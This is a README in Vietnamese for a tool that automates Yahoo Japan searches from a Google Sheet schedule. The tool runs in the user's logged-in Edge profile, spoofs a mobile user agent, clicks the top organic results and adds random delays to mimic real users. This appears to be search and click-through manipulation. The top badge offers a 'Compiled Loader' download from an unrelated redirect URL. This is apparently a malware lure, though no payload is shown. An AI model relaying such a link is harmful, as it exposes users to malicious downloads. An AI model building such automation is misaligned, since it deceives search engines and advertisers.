# Yahoo Japan Search Tool

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Tool tu dong search Yahoo Japan (yahoo.co.jp) dua tren du lieu tu Google Sheet.
Mo tab moi trong trinh duyet Edge dang chay de giu nguyen profile va session dang nhap.

## Cau truc file

```
yahoo-search-tool/
├── .env.example          # Mau file cau hinh
├── .env                  # File cau hinh thuc te (ban tu chinh sua)
├── credentials.json      # Google Service Account (file co san, khong can tao moi)
├── requirements.txt      # Cac thu vien Python can thiet
├── sheet_reader.py       # Doc du lieu tu Google Sheet
├── searcher.py           # Thuc hien search Yahoo bang Playwright
├── main.py               # Chuong trinh chinh
├── create_shortcut.py    # Tao icon shortcut tren Desktop
├── logs/                 # File log theo ngay (tu dong tao)
└── README.md             # Huong dan su dung
```

## Yeu cau

- Python 3.10+
- Microsoft Edge da cai dat
- File `credentials.json` co san trong thu muc (khong can tu tao)

## Cai dat

### 1. Cai dat Python dependencies

```bash
pip install -r requirements.txt
playwright install chromium
```

### 2. Cau hinh .env

Sao chep file mau:

```bash
# Windows
copy .env.example .env
```

Sau do chinh sua file `.env` voi thong tin cua ban:

```env
# Thong tin Google Sheet
SHEET_ID=abc123xyz           # Lay tu URL sheet (xem huong dan ben duoi)
SHEET_NAME=Sheet1            # Ten tab trong sheet
USER_NAME=VO DINH TIEN      # Ten cua ban (viet hoa, chinh xac nhu trong sheet)

# Cau hinh trinh duyet Edge
EDGE_EXECUTABLE_PATH=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
EDGE_USER_DATA_DIR=C:\Users\TenUser\AppData\Local\Microsoft\Edge\User Data
EDGE_PROFILE_DIRECTORY=Default
EDGE_REMOTE_DEBUGGING_PORT=9222
EDGE_CDP_URL=http://localhost:9222

# Mobile User Agent (dung cho che do PC(UA:SP))
MOBILE_USER_AGENT=Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) ...
```

> **Lay Sheet ID:** Tu URL sheet `https://docs.google.com/spreadsheets/d/**SHEET_ID**/edit`

### 3. Tao shortcut tren Desktop (tuy chon)

```bash
python create_shortcut.py
```

Se tao icon "Yahoo Search Tool" tren Desktop. Double-click de chay tool.

## Su dung

### Chay tu dong (khuyen nghi)

```bash
python main.py
```

Tool se:
1. Kiem tra co file log hom nay chua:
   - **Chua co**: Doc tu Google Sheet, tao file log voi tat ca task
   - **Da co**: Doc tu log, bo qua task da hoan thanh, tiep tuc task con lai
2. Kiem tra Edge co dang chay chua, neu chua se tu dong mo
3. Chay tung nhom task, moi nhom cach nhau **1 tieng**
4. Neu bi ngat giua chung, chay lai se tu tinh thoi gian va tiep tuc dung cho

### Chay tat ca lien tuc (khong doi)

```bash
python main.py --all
```

### Kiem tra du lieu sheet (khong search)

```bash
python main.py --test-sheet
```

In ra tat ca task doc duoc tu sheet ma khong thuc hien search.

## Cau truc Google Sheet

Sheet can co cau truc nhu sau:

| Cot A | B | C | D | E | ... |
|-------|---|---|---|---|-----|
| (trong) | 5/5 | | | | |
| (trong) | 8:00 | | 9:00 | | |
| TEN NHAN VIEN | PC | PC(UA:SP) | PC | PC(UA:SP) | |
| trang thai (click hay khong) | co click | khong click | co click | khong click | |
| tu khoa | keyword1 | keyword2 | keyword3 | keyword4 | |

- **Hang ngay (row 1):** Cot A trong, cac cot khac chua ngay (5/5, 5/6, ...)
- **Hang gio (row 2):** Cot A trong, cac cot khac chua gio (8:00, 9:00, ...)
- **Hang ten nhan vien:** Cot A chua ten, cac cot khac chua loai thiet bi (PC / PC(UA:SP))
- **Hang trang thai:** Cot A chua label, cac cot khac chua trang thai click
- **Hang tu khoa:** Cot A chua label, cac cot khac chua tu khoa search

### Giai thich:

| Gia tri | Y nghia |
|---------|---------|
| PC | Search voi trinh duyet binh thuong (desktop) |
| PC(UA:SP) | Search voi User-Agent dien thoai (smartphone) |
| co click / クリック有 | Click vao ket qua dau tien (non-ad), cuon xuong cuoi trang |
| khong click / クリック無 | Chi cuon xuong cuoi trang ket qua, khong click |

## Log theo ngay

Moi ngay tool tu dong tao file `logs/YYYY-MM-DD.json` de luu trang thai tung task:

```json
{
  "date": "2026-05-05",
  "tasks": [
    {
      "hour": 8,
      "keyword": "エイジングケア AMIU",
      "device_type": "PC",
      "should_click": false,
      "status": "success",
      "timestamp": "2026-05-05T08:05:12"
    }
  ]
}
```

- `status`: `pending` / `success` / `failed`
- Khi chay lai trong ngay, cac task `success` se duoc bo qua tu dong

## Luu y

- File `credentials.json` da duoc cau hinh san, **khong can tao moi**
- Tool tu dong mo Edge neu chua chay (dua vao `EDGE_EXECUTABLE_PATH` trong `.env`)
- Moi task duoc thu lai 1 lan neu bi loi
- Co delay ngau nhien giua cac task de giong nguoi dung that
- Neu khong tim thay ten trong sheet, kiem tra lai `USER_NAME` trong `.env` (viet hoa, khong dau)
